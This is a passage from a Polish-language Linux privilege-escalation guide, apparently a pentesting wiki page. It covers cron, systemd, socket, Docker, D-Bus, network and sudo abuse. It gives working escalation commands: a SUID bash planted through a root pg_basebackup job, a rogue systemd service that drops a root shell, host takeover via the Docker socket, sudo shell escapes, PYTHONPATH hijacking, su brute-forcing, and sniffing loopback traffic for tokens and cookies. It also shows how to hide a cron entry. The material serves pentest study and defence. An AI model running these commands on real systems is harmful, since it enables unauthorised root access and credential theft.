Zwykły użytkownik, który może zapisywać dokładnie ten plik binarny, który uruchamia zadanie cron z uprawnieniami root, może przekroczyć granicę uprawnień, ale niestandardowe sprawdzanie podpisu może odrzucić niepodpisaną podmianę. W udokumentowanym przypadku plik ELF należący do root miał tryb `0760`, co pozwalało członkowi jego grupy zapisywać go, a właścicielowi root go wykonywać. Widoczny ślad procesów pokazał, że `objcopy` wyodrębniał `.text_sig`, zanim zadanie uruchomiło plik binarny; pełny skrypt weryfikujący nie był dostępny do odczytu.<sup>[[2]](#references)</sup>

Udana podmiana została podpisana przy użyciu ujawnionych prywatnych materiałów do podpisywania i narzędzia ELF signer. Jego [dokumentacja formatu](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) opisuje sekcję podpisu wyprowadzoną z `.text` pliku wykonywalnego. Nie wykazano, że samo dodanie certyfikatu lub pasującego ciągu do `.text_sig` spełnia wymagania nieujawnionego mechanizmu weryfikacji. Zanim uznasz, że zapisywalny, podpisany plik binarny można wykorzystać do eskalacji uprawnień, sprawdź faktyczną ścieżkę uruchamianą przez zadanie, efektywne uprawnienia do zapisu, wywołanie z uprawnieniami root oraz zasady weryfikacji. Sama sekcja `.text_sig` jest jedynie wskazówką do dalszej analizy.

### Często uruchamiane zadania cron

Możesz monitorować procesy, aby wyszukać te, które są uruchamiane co 1, 2 lub 5 minut. Być może uda Ci się to wykorzystać do eskalacji uprawnień.

Na przykład, aby **monitorować co 0,1 s przez 1 minutę**, **posortować według najmniejszej liczby uruchomień poleceń** i usunąć polecenia, które uruchomiono najczęściej, możesz wykonać:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Możesz też użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy uruchamiany proces).

### Kopie zapasowe roota zachowujące ustawione przez atakującego bity trybu (pg_basebackup)

Jeśli cron działający jako root wywołuje `pg_basebackup` (lub dowolne rekurencyjne kopiowanie) dla katalogu bazy danych, do którego masz uprawnienia zapisu, możesz umieścić w nim **binarny plik SUID/SGID**, który zostanie skopiowany jako **root:root** z zachowaniem tych samych bitów trybu w lokalizacji kopii zapasowej.<sup>[[26]](#references)</sup>

Typowy proces wykrywania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby wykryć cron roota wywołujący co minutę coś w rodzaju `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Potwierdź, że możesz zapisywać w źródłowym klastrze (np. `/var/lib/postgresql/14/main`), a katalog docelowy (`/opt/backups/current`) po wykonaniu zadania należy do roota.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Działa to dlatego, że `pg_basebackup` zachowuje bity trybu plików podczas kopiowania klastra; gdy jest uruchamiane przez roota, pliki docelowe dziedziczą **własność roota + wybrane przez atakującego bity SUID/SGID**. Każda podobna uprzywilejowana procedura tworzenia kopii zapasowej/kopiowania, która zachowuje uprawnienia i zapisuje pliki w lokalizacji wykonywalnej, jest podatna na atak.

### Niewidoczne zadania cron

Można utworzyć zadanie cron, **umieszczając znak powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Aby wykryć tego rodzaju ukryty wpis, sprawdź pliki cron za pomocą narzędzi ujawniających znaki sterujące:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Usługi

### Zapisywalne pliki _.service_

Sprawdź, czy możesz zapisywać w dowolnym pliku `.service`. Jeśli tak, **możesz go zmodyfikować**, aby **uruchamiał** Twoje **backdoor, gdy** usługa zostanie **uruchomiona**, **ponownie uruchomiona** lub **zatrzymana** (być może trzeba będzie poczekać na ponowne uruchomienie maszyny).\
Na przykład utwórz backdoor w pliku .service, dodając **`ExecStart=/tmp/script.sh`**

### Zapisywalne pliki binarne usług

Pamiętaj, że jeśli masz **uprawnienia do zapisu do plików binarnych uruchamianych przez usługi**, możesz zastąpić je backdoorami, które zostaną uruchomione przy ponownym uruchomieniu usług.

### systemd PATH - ścieżki względne

Możesz sprawdzić PATH używany przez **systemd** za pomocą:

```bash
systemctl show-environment
```

Jeśli okaże się, że możesz **zapisywać** w którymkolwiek z folderów w ścieżce, być może uda Ci się **eskalować uprawnienia**. Musisz poszukać **ścieżek względnych używanych w plikach konfiguracji usług**, takich jak:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Następnie utwórz **plik wykonywalny** o **takiej samej nazwie jak binarny plik ze ścieżki względnej** w zapisywalnym przez Ciebie katalogu PATH systemd. Gdy usługa otrzyma polecenie wykonania podatnej akcji (**Start**, **Stop**, **Reload**), zostanie uruchomiony Twój **backdoor** (nieuprzywilejowani użytkownicy zwykle nie mogą uruchamiać ani zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Więcej informacji o usługach znajdziesz w `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd o nazwach kończących się na `**.timer**`, które sterują plikami `**.service**` lub zdarzeniami. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowaną obsługę zdarzeń kalendarzowych i monotonicznych oraz mogą działać asynchronicznie.

Wszystkie timery można wyliczyć za pomocą:

```bash
systemctl list-timers --all
```

### Timery z prawem zapisu

Jeśli możesz zmodyfikować timer, możesz sprawić, by uruchamiał istniejące jednostki systemd.unit (takie jak `.service` lub `.target`).

```bash
Unit=backdoor.service
```

W dokumentacji możesz przeczytać, czym jest Unit:

> Jednostka aktywowana po upływie czasu timera. Argumentem jest nazwa jednostki, której przyrostek nie może mieć postaci „.timer”. Jeśli nie zostanie określona, domyślnie używana jest usługa o tej samej nazwie co jednostka timera, z pominięciem przyrostka. (Patrz wyżej). Zaleca się, aby nazwa aktywowanej jednostki i nazwa jednostki timera były identyczne, z wyjątkiem przyrostka.

Aby nadużyć tego uprawnienia, musisz:

- Znaleźć jednostkę systemd (np. `.service`), która **wykonuje zapisywalny plik binarny**
- Znaleźć jednostkę systemd, która **wykonuje ścieżkę względną**, i mieć **uprawnienia do zapisu** w **systemd PATH** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach, używając `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i musisz wykonać:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Zwróć uwagę, że **timer** jest **aktywowany** przez utworzenie dowiązania symbolicznego do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Gniazda

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** na tej samej lub różnych maszynach w modelach klient-serwer. Wykorzystują standardowe pliki deskryptorów Uniksa do komunikacji między komputerami i są konfigurowane za pomocą plików `.socket`.<sup>[[14]](#references)</sup>

Gniazda można konfigurować za pomocą plików `.socket`.

**Więcej informacji o gniazdach znajdziesz w `man systemd.socket`.** W tym pliku można skonfigurować kilka interesujących parametrów:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: To różne opcje, które łącznie **wskazują, gdzie będzie nasłuchiwać** gniazdo (ścieżka do pliku gniazda AF_UNIX, adres IPv4/6 i/lub numer portu, na którym ma nasłuchiwać itd.)
- `Accept`: Przyjmuje argument logiczny. Jeśli ma wartość **true**, dla każdego przychodzącego połączenia **uruchamiana jest instancja usługi**, której przekazywane jest wyłącznie gniazdo połączenia. Jeśli ma wartość **false**, same gniazda nasłuchujące są **przekazywane do uruchomionej jednostki usługi**, a jedna jednostka usługi jest uruchamiana dla wszystkich połączeń. Ta wartość jest ignorowana w przypadku gniazd datagramowych i FIFO, dla których jedna jednostka usługi bezwarunkowo obsługuje cały przychodzący ruch. **Domyślna wartość to false**. Ze względów wydajnościowych zaleca się, aby nowe demony były tworzone wyłącznie w sposób zgodny z `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Przyjmuje jeden lub więcej wierszy poleceń, które są **wykonywane odpowiednio przed** lub **po utworzeniu** i powiązaniu gniazd/FIFO nasłuchujących. Pierwszy element wiersza poleceń musi być bezwzględną nazwą pliku, po której następują argumenty procesu.
- `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane odpowiednio przed** lub **po zamknięciu** i usunięciu gniazd/FIFO nasłuchujących.
- `Service`: Określa nazwę jednostki **usługi do aktywowania** po otrzymaniu **przychodzącego ruchu**. To ustawienie jest dozwolone tylko w przypadku gniazd z `Accept=no`. Domyślnie używana jest usługa o tej samej nazwie co gniazdo (z podmienionym sufiksem). W większości przypadków nie powinno być konieczne używanie tej opcji.

### Zapisywalne pliki .socket

Jeśli znajdziesz **zapisywalny** plik `.socket`, możesz **dodać** na początku sekcji `[Socket]` coś w rodzaju: `ExecStartPre=/home/kali/sys/backdoor`, a backdoor zostanie uruchomiony przed utworzeniem gniazda. Dlatego **prawdopodobnie trzeba będzie poczekać na ponowne uruchomienie maszyny.**\
_Pamiętaj, że system musi korzystać z konfiguracji tego pliku gniazda, inaczej backdoor nie zostanie uruchomiony_

### Aktywacja gniazda + zapisywalna ścieżka jednostki (utworzenie brakującej usługi)

Inną poważną błędną konfiguracją jest sytuacja, gdy:

- jednostka gniazda ma `Accept=no` i `Service=<name>.service`
- wskazana jednostka usługi nie istnieje
- atakujący może zapisywać w `/etc/systemd/system` (lub innej ścieżce wyszukiwania jednostek)

W takiej sytuacji atakujący może utworzyć `<name>.service`, a następnie wygenerować ruch do gniazda, aby systemd załadował i uruchomił nową usługę jako root.

Skrócony przebieg:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Gniazda z prawem zapisu

Jeśli **znajdziesz gniazdo z prawem zapisu** (_mówimy tu o Unix Sockets, a nie o plikach konfiguracyjnych `.socket`_), możesz **komunikować się** z tym gniazdem i być może wykorzystać podatność.

### Enumerowanie Unix Sockets

```bash
netstat -a -p --unix
```

### Surowe połączenie

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Przykład wykorzystania:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Gniazda HTTP

Zwróć uwagę, że mogą istnieć **gniazda nasłuchujące na żądania HTTP** (_nie chodzi mi o pliki .socket, lecz o pliki działające jako gniazda unix_). Możesz to sprawdzić za pomocą:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Jeśli socket **odpowiada na żądanie HTTP**, możesz się z nim **komunikować** i być może **wykorzystać jakąś lukę**.

### Zapisywalny socket Docker

Socket Docker, często znajdujący się pod adresem `/var/run/docker.sock`, to krytyczny plik, który należy zabezpieczyć. Domyślnie można w nim zapisywać jako użytkownik `root` oraz członek grupy `docker`. Dostęp do zapisu w tym sockecie może prowadzić do eskalacji uprawnień. Poniżej przedstawiono, jak można to zrobić, oraz alternatywne metody na wypadek, gdy Docker CLI nie jest dostępny.

#### **Eskalacja uprawnień za pomocą Docker CLI**

Jeśli masz dostęp do zapisu w sockecie Docker, możesz eskalować uprawnienia za pomocą następujących poleceń:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Te polecenia pozwalają uruchomić kontener z dostępem na poziomie root do systemu plików hosta.

#### **Bezpośrednie użycie Docker API**

Jeśli Docker CLI nie jest dostępne, nadal można nadużyć gniazda Docker, używając surowego HTTP przez gniazdo Unix. Najbardziej niezawodny przebieg wygląda następująco:

- utwórz długotrwały kontener pomocniczy z podmontowanym katalogiem root hosta
- uruchom go
- utwórz instancję `exec` wewnątrz tego kontenera
- uruchom instancję `exec` i odczytaj dane wyjściowe za pośrednictwem API

**Lista obrazów Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Utwórz i uruchom kontener pomocniczy**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Utwórz instancję exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Uruchom instancję exec i odczytaj dane wyjściowe**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Ten wzorzec jest zwykle bardziej niezawodny niż ręczne sterowanie `attach` za pomocą `socat` lub `nc -U`. Gdy możesz utworzyć pomocniczy kontener z `/:/host`, możesz użyć dodatkowych instancji `exec`, aby odczytywać pliki, takie jak `/host/root/...`, dodawać klucze SSH w `/host/root/.ssh` lub modyfikować pliki startowe hosta.

### Inne

Pamiętaj, że jeśli masz uprawnienia do zapisu w gnieździe dockera, ponieważ **należysz do grupy `docker`**, masz [**więcej sposobów na eskalację uprawnień**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Jeśli [**docker API nasłuchuje na porcie**, możesz również przejąć nad nim kontrolę](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Sprawdź **więcej sposobów na ucieczkę z kontenerów lub nadużycie środowisk uruchomieniowych kontenerów w celu eskalacji uprawnień** na stronie:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Eskalacja uprawnień za pomocą Containerd (ctr)

Jeśli okaże się, że możesz użyć polecenia **`ctr`**, przeczytaj następną stronę, ponieważ **możesz być w stanie go nadużyć w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Eskalacja uprawnień za pomocą **RunC**

Jeśli okaże się, że możesz użyć polecenia **`runc`**, przeczytaj następną stronę, ponieważ **możesz być w stanie go nadużyć w celu eskalacji uprawnień**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus to zaawansowany **system komunikacji międzyprocesowej (IPC)**, który umożliwia aplikacjom sprawną interakcję i udostępnianie danych. Zaprojektowany z myślą o współczesnych systemach Linux, zapewnia solidny mechanizm obsługi różnych form komunikacji między aplikacjami.<sup>[[16]](#references)</sup>

System jest wszechstronny: obsługuje podstawowe IPC, usprawniające wymianę danych między procesami, podobnie jak **rozszerzone gniazda domeny UNIX**. Ułatwia też rozgłaszanie zdarzeń lub sygnałów, zapewniając płynną integrację komponentów systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając komfort użytkownika. Ponadto D-Bus obsługuje system obiektów zdalnych, upraszczając żądania usług i wywoływanie metod między aplikacjami oraz usprawniając procesy, które tradycyjnie były złożone.

D-Bus działa w oparciu o **model allow/deny**, zarządzając uprawnieniami do wiadomości (wywołań metod, emisji sygnałów itp.) na podstawie łącznego wpływu pasujących reguł polityki. Polityki te określają interakcje z magistralą i mogą potencjalnie umożliwić eskalację uprawnień przez wykorzystanie tych uprawnień.

Poniżej przedstawiono przykład takiej polityki z pliku `/etc/dbus-1/system.d/wpa_supplicant.conf`, określającej uprawnienia użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie powszechne, natomiast polityki kontekstu „default” dotyczą wszystkich przypadków nieobjętych innymi, bardziej szczegółowymi politykami.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Dowiedz się tutaj, jak enumerować i wykorzystywać komunikację D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerować sieć i ustalić pozycję maszyny.

### Ogólna enumeracja

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Jeśli aktywny wpis w `/etc/inetd.conf` uruchamia GNU Inetutils `telnetd` jako root, sprawdź skonfigurowaną wersję binarną i lokalny listener, nawet jeśli port jest zbindowany tylko do loopbacka. W GNU Inetutils w wersjach od 1.9.3 do 2.7 występował [bypass uwierzytelniania Telnet](https://seclists.org/oss-sec/2026/q1/89), w którym dostarczony przez klienta `USER` trafiał do `login -f` (CVE-2026-24061). Proces lub ciąg wersji to jedynie wskaźnik — przed uznaniem usługi za podatną potwierdź status poprawek dostawcy i sprawdź faktycznie działający daemon. Więcej informacji zawiera [przewodnik po Telnet](../../../network-services-pentesting/pentesting-telnet.md).

### Szybka wstępna analiza filtrowania ruchu wychodzącego

Jeśli host może uruchamiać polecenia, ale callbacki zawodzą, szybko rozdziel filtrowanie DNS, transportu, proxy i tras:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Otwarte porty

Zawsze sprawdzaj usługi sieciowe działające na maszynie, z którymi nie udało Ci się wejść w interakcję przed uzyskaniem do niej dostępu:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klasyfikuj usługi nasłuchujące według adresu bindowania:

- `0.0.0.0` / `[::]`: dostępne na wszystkich lokalnych interfejsach.
- `127.0.0.1` / `::1`: dostępne tylko lokalnie (dobre cele dla tunnel/forward).
- Konkretne wewnętrzne adresy IP (np. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): zwykle dostępne tylko z wewnętrznych segmentów sieci.

### Wstępna analiza usług dostępnych tylko lokalnie

Po przejęciu hosta usługi powiązane z `127.0.0.1` często po raz pierwszy stają się dostępne z Twojej powłoki. Szybki lokalny workflow wygląda tak:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS jako skaner sieciowy (tryb wyłącznie sieciowy)

Oprócz lokalnych kontroli PE linPEAS może działać jako wyspecjalizowany skaner sieciowy. Korzysta z dostępnych plików binarnych w `$PATH` (zazwyczaj `fping`, `ping`, `nc`, `ncat`) i nie instaluje dodatkowych narzędzi.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

If użyjesz `-d`, `-p` lub `-i` bez `-t`, linPEAS działa jako czysty skaner sieci (pomijając pozostałe kontrole eskalacji uprawnień).

### Sniffing

Sprawdź, czy możesz sniffować ruch sieciowy. Jeśli tak, możesz być w stanie przechwycić dane uwierzytelniające.

```
timeout 1 tcpdump
```

Szybkie praktyczne testy:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) jest szczególnie cenny w post-exploitation, ponieważ wiele usług dostępnych wyłącznie wewnętrznie udostępnia tam tokeny/cookies/poświadczenia:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Przechwyć teraz, parsuj później:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Użytkownicy

### Ogólna enumeracja

Sprawdź, **kim** jesteś, jakie **uprawnienia** masz, jacy **użytkownicy** są w systemie, którzy mogą się **logować** i którzy mają **uprawnienia root:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Duży UID

Niektóre wersje Linuksa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** eskalować uprawnienia. Więcej informacji: [tutaj](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [tutaj](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [tutaj](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Wykorzystaj błąd** za pomocą: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem grupy**, która może zapewnić uprawnienia roota:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajdują się jakieś interesujące dane (jeśli to możliwe)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Polityka haseł

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Znane hasła

Jeśli **znasz jakiekolwiek hasło** do środowiska, **spróbuj zalogować się jako każdy użytkownik**, używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego szumu, a na komputerze są dostępne pliki binarne `su` i `timeout`, możesz spróbować przeprowadzić brute-force użytkowników za pomocą [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force użytkowników.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli okaże się, że możesz **zapisywać pliki w którymś folderze z $PATH**, możesz eskalować uprawnienia, **tworząc backdoor w zapisywalnym folderze** o nazwie polecenia, które ma zostać wykonane przez innego użytkownika (najlepiej root) i które **nie jest ładowane z folderu znajdującego się wcześniej w $PATH** niż Twój zapisywalny folder.

### SUDO i SUID

Możesz mieć możliwość wykonywania niektórych poleceń za pomocą sudo albo mogą one mieć ustawiony bit suid. Sprawdź to za pomocą:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonywać polecenia**.<sup>[[8]](#references)</sup> Na przykład:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Konfiguracja sudo może pozwalać użytkownikowi uruchamiać niektóre polecenia z uprawnieniami innego użytkownika bez znajomości hasła.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

W tym przykładzie użytkownik `demo` może uruchomić `vim` jako `root`. Zdobycie powłoki jest teraz banalne — wystarczy dodać klucz SSH do katalogu `root` albo wywołać `sh`.

```
sudo vim -c '!sh'
```

### Niezacytowane porównanie Bash w skrypcie sudo

W Bash prawa strona wyrażenia `[[ "$protected" == $candidate ]]` jest wzorcem. Jeśli skrypt sudo z uprawnieniami roota przypisuje zmiennej `candidate` wartość z pliku kontrolowanego przez wywołującego, wartość taka jak `prefix*` może dopasować początek chronionego ciągu. Różne ścieżki sukcesu i błędu mogą wtedy ujawnić prefiks za pomocą wyroczni. Jeśli zamierzone jest dosłowne porównanie równości, ujmij prawą stronę w cudzysłów (`[[ "$protected" == "$candidate" ]]`). Zanim uznasz niezacytowane porównanie za podatne na wykorzystanie, sprawdź rzeczywiste argumenty sudo, źródło danych wejściowych i obserwowalne zachowanie poszczególnych gałęzi. [Podręcznik GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) opisuje działanie wzorców.

### Pliki projektów PrusaSlicer uruchamiane przez sudo

Nieograniczone nadanie przez sudo uprawnień roota do uruchomienia `prusaslicer` lub `prusa-slicer` wymaga sprawdzenia, jeśli wywołujący może wybrać projekt `.3mf` do pocięcia. Projekt może zawierać skrypt postprocessingu uruchamiany podczas eksportowania G-code; spreparowane projekty mogły wykonywać polecenia w PrusaSlicerze do wersji 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Zanim stwierdzisz, że możliwe jest przekroczenie granicy uprawnień, sprawdź obowiązującą regułę sudo, wersję programu i poprawki dostawcy, źródło projektu oraz to, czy odpowiednia ścieżka eksportu rzeczywiście się uruchamia. Stały argument projektu lub obowiązująca polityka `NOEXEC` mogą zmienić wynik. Samo stwierdzenie, że slicer jest zainstalowany, nie dowodzi istnienia ścieżki eskalacji uprawnień.

### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania polecenia:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Ten przykład, **oparty na maszynie HTB Admirer**, był **podatny** na **PYTHONPATH hijacking**, umożliwiające załadowanie dowolnej biblioteki Pythona podczas wykonywania skryptu jako root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

